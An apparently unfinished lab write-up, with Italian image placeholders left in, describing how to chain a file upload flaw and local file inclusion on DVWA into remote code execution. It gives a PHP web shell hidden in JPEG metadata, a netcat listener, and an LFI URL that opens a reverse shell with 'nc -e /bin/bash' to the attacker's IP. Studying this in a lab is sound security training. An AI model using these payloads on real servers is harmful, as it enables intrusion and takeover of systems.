# Remote Command Execution via File Upload and Local File Inclusion on DVWA Web Application

## Overview

The following report documents the results of a simulated attack that exploits a File Upload vulnerability and a Local File Inclusion one, leading to the compromise of a web server via Remote Code Execution, by using techniques involving hiding information (malicious payloads) inside a file (steganography).

## Attack Methods 
### File Upload
File Upload vulnerabilities allow the upload of file types that can be dangerous if processed in the environment. A common consqeuence is Execute Unauthorized Code or Commands (Impact tactic in the MITRE Framework) if the file uploaded contains code that would be arbitrary executed on the victim's machine.

File Upload vulnerabilities occur when a web application allows users to upload files to the server's filesystem without sufficient validation of their type, contents, or size. A common consequence of this flaw is the execution of unauthorized code or commands (aligning with the "Execution" and "Impact" tactics in the MITRE ATT&CK Framework). If the uploaded file contains malicious code that the web server subsequently processes, an attacker can trigger arbitrary execution on the victim's machine.

### Local File Inclusion
Local File Inclusion vulnerabilities allow to read and/or execute files on a victim machine, that can lead to gain unwanted access due to misconfigurations.

Local File Inclusion vulnerabilities arise when an application includes a local file without properly sanitizing the input path. This flaw allows an attacker to read and, in some cases, execute local files present on the target server. It typically stems from misconfigurations or insufficient input validation, leading to unauthorized information disclosure or arbitrary code execution.

The combination of these two exploits can make an attacker be able to inject code into a file, upload it and execute the malicious code. 

The combination (or "chaining") of these two vulnerabilities allows an attacker to bypass severe upload restrictions: the malicious code is first injected into a seemingly benign file (such as an image), successfully uploaded, and subsequently executed by forcing the server to parse it via the LFI flaw.

### Threat Model
Attacker that has access to the web application.

## Technical Configuration
This simulation has been done by using two virtual machines running Kali

## Attack Flow

### Phase 1 - Defense Analysis
The DVWA level is set to **high**, which means
- for File Upload: the file has to be necessarily *.jpeg or *.png, otherwise it would be rejected;
- for File Inclusion: the application restricts input by whitelisting filenames. 

### Phase 2 - Payload Creation
This aim of this phase is to create a file to upload that contains php code in a way that it would be accepted from the Web Application.
First of all download a real JPEG picture; secondly, using `exiftool`, inject a command into the picture's metadata, for example in the "Comment" field:
```bash
exiftool -Comment="<?php system(\_GET['cmd']); ?>" image.jpeg
``` 
The command injected puts in the Comment field a php script that will open a shell executing the command specified after the "cmd" parameter in the request.

Finally, change the file name into `shell.php.jpeg`, without altering the original extension. 

Now the file is ready to be loaded and accepted from the Web Application.

### Phase 3 - Payload Upload
In the "File Upload" section of the DVWA we can upload the file prepared: it is accepted since it has the correct extension and the first bytes of the file correspond to a jpeg's ones. If the upload is successful, a message telling the location of the file and the success of the operation will appear. INSERIRE IMMAGINE

### Phase 4 - Listening Session
In order to execute RCE, a listening session has to be opened. In a new terminal, using `nc` (NetCat) command with the following flags on:
```bash
nc -lvnp 4444
```
`l` to make it work as a Server that waits connections, `v` to make it verbose, `n` to make it numeric-only (does not resolve DNS names) and `p` to specify the port on which it will be listening.

### Phase 5 - Execution
For this phase, go to the File Inclusion section. In order to execute the file on the victim machine, it is needed to modify the address in this way:
```
.../fi/?page=file:///var/www/html/DVWA/hackable/uploads/shell.php.jpeg&cmd=whoami
```
which is composed from:
- file://, the protocol that allows to FINIRE
- /var/.../shell.php.jpeg, the absolute path to the corrupted file created and uploaded before;
- cmd, the query parameter that would be considered from the script we injected in the corrupted file;
- `whoami`, the bash command that will return the name of the user logged on at the moment of the execution.

After loading this webpage, the content of the file will be seen on the screen: in the first few bytes will be located the result of the command `whoami`, as showed in the picture below: IMMAGINE

Now, in order to connect to the Server opened in the previous phase, the cmd parameter content has to be changed in:

```
.../fi/?page=file:///var/www/html/DVWA/hackable/uploads/shell.php.jpeg&cmd=nc%20192.168.56.102%204444%20-e%20/bin/bash
```

- `nc 192.168.56.102 4444 -e /bin/bash`, the bash command that will open the connection on port 4444 at 192.168.56.102, which is the ip address of the attacking machine; in the URL spaces are filled with %20 since it is the URL-format code for the space character, in order to avoid wrong behaviors.

### Phase 6 - Reverse Shell
Now in the terminal opened before with the listening session active, the message of a connection received will be shown. It is now connected to the victim machine, as it can be seen when executing the `ip a` command, that will show the ip address 192.168.56.101, the victim's one. IMMAGINE 

## Conclusions

## Bibliography
